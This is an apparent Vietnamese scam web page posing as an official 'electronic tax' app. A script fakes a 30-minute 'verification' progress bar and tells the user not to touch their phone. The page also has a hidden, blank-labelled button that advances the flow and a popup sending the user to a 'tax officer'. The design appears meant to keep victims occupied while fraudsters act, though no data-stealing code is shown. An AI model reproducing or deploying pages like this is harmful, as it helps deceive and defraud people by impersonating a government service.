<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <link rel="stylesheet" href="../public/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    
    <title>Thuế Điện Tử</title>
    <link rel="icon" type="image/png" href="../image/thuedinetu.png" sizes="32x32">


</head>
<!--<div id="alert-container" style="position: fixed; top: 20px; right: 20px; z-index: 1050;"></div>-->

<div id="alert-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1049;"></div>
<div id="alert-popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1050;"></div>

<div id="customConfirm" class="custom-confirm" style="display: none;">
    <div class="confirm-box">
        <p class="confirm-message">Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.</p>
        <button class="confirm-ok-btn">OK</button>
    </div>
</div>

<!-- Popup thông báo mới -->
<div id="customPopupCuoi" class="custom-popup-cuoi">
    <div class="custom-popup-content-cuoi">
        <span class="custom-close-btn-cuoi" id="closePopupCuoi">&times;</span>
        <div class="bg-white-cuoi">
            <p id="popupMessageCuoi">Thông báo sẽ hiển thị ở đây.</p>
            <button type="button" class="confirm-ok-btn mt-1" id="okButtonCuoi">Tiếp tục</button>
        </div>
    </div>
</div>



<header>
    <button class="header-button" onclick="window.location.href='end-loading.php'">ㅤㅤ</button>
</header>





<script src="../public/js/style.js"></script>    <div class="container">
        <div class="app-loading">
            <a href="confirm.php"><h2 class="text-white">THUẾ ĐIỆN TỬ</h2></a>
            
            <img width="200" src="../image/theunotexxt (1).png" alt="">
            <!-- Thanh loading -->
            <div class="progress-container">
                <progress id="loadingBar" value="0" max="100"></progress>
                <span id="loadingPercent">1%</span>
            </div>
            <h3>NHÂN VIÊN ĐANG XÁC THỰC VUI LÒNG KHÔNG THAO TÁC TRÊN ĐIỆN THOẠI</h3>
            
            
        </div>
    </div>



   <script>
    // Tổng thời gian (30 phút -> mili giây)
    const totalTime = 30 * 60 * 1000;
    const initialFastTime = 2 * 60 * 1000; // 2 phút đầu -> mili giây
    const fastPercentage = 30; // Phần trăm chạy nhanh trong 2 phút đầu

    const loadingBar = document.getElementById('loadingBar');
    const loadingPercent = document.getElementById('loadingPercent');

    let startTime = Date.now();

    // Cập nhật tiến độ thanh loading
    function updateProgress() {
        let elapsedTime = Date.now() - startTime; // Thời gian đã trôi qua
        let percentage;

        if (elapsedTime <= initialFastTime) {
            // Giai đoạn chạy nhanh: 2 phút đầu đến 30%
            percentage = (elapsedTime / initialFastTime) * fastPercentage;
        } else {
            // Giai đoạn chạy chậm: từ 30% đến 100%
            let remainingTime = elapsedTime - initialFastTime; // Thời gian còn lại sau 2 phút đầu
            let remainingPercentage = 100 - fastPercentage; // Phần trăm còn lại để đạt 100%
            let adjustedTotalTime = totalTime - initialFastTime; // Thời gian còn lại sau giai đoạn nhanh
            percentage = fastPercentage + (remainingTime / adjustedTotalTime) * remainingPercentage;
        }

        percentage = Math.min(percentage, 100); // Đảm bảo không vượt quá 100%
        loadingBar.value = percentage; // Cập nhật thanh loading
        loadingPercent.innerText = Math.round(percentage) + '%'; // Cập nhật phần trăm hiển thị

        // Nếu chưa đủ 100% thì tiếp tục cập nhật
        if (percentage < 100) {
            requestAnimationFrame(updateProgress);
        }
    }

    // Bắt đầu cập nhật
    updateProgress();
</script>

</body>
</html>
